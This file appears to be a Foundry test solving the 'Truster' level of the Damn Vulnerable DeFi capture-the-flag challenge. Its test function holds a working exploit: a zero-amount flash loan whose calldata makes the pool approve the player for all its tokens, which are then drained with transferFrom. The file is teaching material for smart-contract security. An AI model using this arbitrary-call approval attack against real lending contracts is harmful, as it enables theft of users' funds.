// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/vm.sol";
import "../src/levels/Truster/TrusterLendingPool.sol";

contract TrusterTest is DSTest {
    uint256 constant TOKENS_IN_POOL = 1_000_000 ether;
    Vm private constant vm = Vm(HEVM_ADDRESS);

    address deployer = address(uint160(uint256(keccak256("DEPLOYER"))));
    address player = address(uint160(uint256(keccak256("PLAYER"))));

    DamnValuableToken token;
    TrusterLenderPool pool;

    function setUp() public {
        vm.startPrank(deployer);

        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);

        assertEq(address(pool.token()), address(token));

        token.transfer(address(pool), TOKENS_IN_POOL);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);

        vm.stopPrank();
    }

    function testIsTrusterPassed() public {
        vm.startPrank(player);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            player,
            TOKENS_IN_POOL
        );

        pool.flashLoan(0, player, address(token), data);

        token.transferFrom(address(pool), player, TOKENS_IN_POOL);

        vm.stopPrank();

        assertEq(token.balanceOf(address(pool)), 0);
        assertEq(token.balanceOf(player), TOKENS_IN_POOL);
    }
}
